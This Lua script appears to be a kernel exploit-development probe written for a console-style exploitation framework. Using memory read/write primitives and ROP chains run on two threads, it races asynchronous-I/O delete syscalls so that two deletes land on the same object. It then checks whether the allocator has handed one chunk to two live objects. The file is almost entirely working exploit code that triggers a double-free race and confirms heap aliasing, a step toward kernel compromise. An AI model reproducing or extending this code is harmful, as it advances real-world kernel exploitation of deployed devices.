-- CRASH_CLASS: HIGH
-- PROBE 707a: after the two-child AIO delete race, create fresh objects and ask
-- whether the allocator handed the same chunk to two live entries.
--
-- Context: 633c showed two racing deletes sometimes both reporting success for
-- the same id (status 0 in both pre-filled pages). Two readings remain:
--   (a) the loser's second lookup missed and wrote 0 without freeing (a lie), or
--   (b) both freed the same object, so the allocator's free list now holds that
--       chunk twice.
-- Reading (b) is directly observable: a later create would hand the duplicated
-- chunk to two different objects, so deleting the first would destroy the
-- second's storage and the second delete would stop answering 0.
--
-- No crafted pointers are used here; the probe only creates, polls and deletes.
-- If the table is already corrupt the process may die, so each phase is
-- announced before it runs.

print("=== PROBE 707a: AIO post-race allocator alias test ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function U(a)
    a=N(a)
    return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296))
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local o,v=pcall(function() return memory.read_dword(a) end)
    if o then return N(v) end
    return nil
end

local sc669=mk(669) local sc662=mk(662) local sc664=mk(664) local sc454=mk(454)

local function create_one()
    local data=memory.alloc(0x100)
    local out=memory.alloc(8)
    for i=0,0xFC,4 do wd(N(data)+i,0) end
    wd(N(out),0)
    local ok,rv=pcall(function() return sc669(uint64(0x1001),U(N(data)),uint64(1),uint64(1),U(N(out))) end)
    if not ok then return nil,"create-fail" end
    local id=rd(N(out)) or 0
    if id==0 then return nil,"no-id" end
    local st=memory.alloc(8)
    wd(N(st),0x77777777)
    pcall(function() sc664(U(N(out)),uint64(1),U(N(st))) end)
    return id,rd(N(st)) or -1
end

local function delete_one(id)
    local ids=memory.alloc(8)
    local st=memory.alloc(8)
    wd(N(ids),id)
    wd(N(st),0x77777777)
    local ok,rv=pcall(function() return sc662(U(N(ids)),uint64(1),U(N(st))) end)
    if not ok then return "pcall-fail" end
    local v=rd(N(st))
    if v==nil then return "no-read" end
    if v==0 then return "0" end
    return string.format("0x%08X",v)
end

-- victim with four ids, deleted by two children at once
local NIDS=4
local data=memory.alloc(0x1000)
local out=memory.alloc(8)
for i=0,0xFFC,4 do wd(N(data)+i,0) end
local okc,rv=pcall(function() return sc669(uint64(0x1001),U(N(data)),uint64(NIDS),uint64(1),U(N(out))) end)
local base=rd(N(out)) or 0
print(string.format("[A] victim create ok=%s rv=%s base=%s",tostring(okc),tostring(rv),tostring(base)))
if base<=0 then print("[!] no victim"); return end
local ids=memory.alloc(NIDS*4)
for i=0,NIDS-1 do wd(N(ids)+i*4, base + i*0x10000) end
local chk=memory.alloc(8)
local ready=0
for i=0,NIDS-1 do
    wd(N(chk),0)
    pcall(function() sc664(U(N(ids)+i*4),uint64(1),U(N(chk))) end)
    local st=rd(N(chk))
    if st==3 or st==0x10003 then ready=ready+1 end
end
print(string.format("[B] polled %d/%d",ready,NIDS))

local W=memory.alloc(8)
wq(N(W),uint64(0))
local stA=memory.alloc(NIDS*4)
local stB=memory.alloc(NIDS*4)
for i=0,NIDS*4-1,4 do wd(N(stA)+i,0x77777777) wd(N(stB)+i,0x77777777) end
local function build(stp,rev)
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x10000})
    c:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
    for k=0,NIDS-1 do
        local i=k
        if rev then i=NIDS-1-k end
        c:push_syscall_with_ret(mk(662), U(N(ids)+i*4), uint64(1), U(N(stp)+i*4))
    end
    return c
end
local ta=thread:new(build(N(stA),false))
local tb=thread:new(build(N(stB),false))
print("[C] chains built, launching")
ta:run(true)
tb:run(true)
for i=1,600000 do local x=i end
wq(N(W),uint64(1))
local o1,r1=pcall(function() return sc454(U(N(W)),uint64(3),uint64(0x7fffffff)) end)
print(string.format("[D] wake ok=%s rv=%s",tostring(o1),tostring(r1)))
ta:join()
tb:join()
print("[E] joined")
local both=0
local line=""
for i=0,NIDS-1 do
    local a=rd(N(stA)+i*4) local b=rd(N(stB)+i*4)
    if a==0 and b==0 then both=both+1 end
    line=line..string.format(" %d:%s/%s",i,tostring(a),tostring(b))
end
print(string.format("[F] both-zero=%d",both))
print("[G]"..line)

print("[H] alias test: 8 create/poll/delete pairs")
local anomalies=0
for round=1,8 do
    local id1,p1=create_one()
    if not id1 then print(string.format("  r%d create1 %s",round,tostring(p1))); anomalies=anomalies+1
    else
        local id2,p2=create_one()
        if not id2 then print(string.format("  r%d create2 %s",round,tostring(p2))); anomalies=anomalies+1
        else
            -- delete the newer first: if it shared storage with id1, id1 breaks
            local s2=delete_one(id2)
            local s1=delete_one(id1)
            print(string.format("  r%d ids=%d/%d poll=%s/%s del2=%s del1=%s",
                round,id1,id2,tostring(p1),tostring(p2),s2,s1))
            if s1~="0" or s2~="0" then anomalies=anomalies+1 end
        end
    end
end
print(string.format("[I] anomalies=%d",anomalies))
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
